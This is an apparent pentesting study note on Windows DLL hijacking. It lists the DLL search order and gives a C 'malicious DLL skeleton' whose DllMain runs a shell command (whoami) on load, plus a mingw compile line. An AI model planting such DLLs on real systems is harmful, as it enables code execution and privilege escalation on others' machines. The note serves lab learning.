# DLL Hijacking

## Windows DLL Search Order

Windows DLL search order if `SafeDllSearchMode` is enabled:

* The application directory
* The system directory (as returned by `GetSystemDirectory()`)
* The 16-bit (!) system directory
* The Windows directory (as returned by `GetWindowsDirectory()`)
* The current directory (!)
* The system `PATH` (!)

Windows DLL search order if `SafeDllSearchMode` is disabled:

* The application directory
* The current directory (!)
* The system directory (as returned by `GetSystemDirectory()`)
* The 16-bit (!) system directory
* The Windows directory (as returned by `GetWindowsDirectory()`)
* The system `PATH` (!)

Note that it seems more-or-less impossible to determine what DLLs an application is searching for without having SYSTEM access already (so tools like ProcMon can be run).

* [TryHackMe: Jr. Penetration Tester](https://tryhackme.com/path/outline/jrpenetrationtester)
* [Exploiting LD_PRELOAD](./Exploiting%20LD_PRELOAD.md)
* [Exploiting LD_LIBRARY_PATH](./Exploiting%20LD_LIBRARY_PATH.md)

## Malicious DLL Skeleton

```c
#include <windows.h>

BOOL WINAPI DllMain
(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
	if (dwReason == DLL_PROCESS_ATTACH) {
		system("cmd.exe /C whoami > C:\Temp\dll.txt");
		ExitProcess(0);
	}
	return TRUE;
}
```

Compile with mingw (on Linux!):

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```
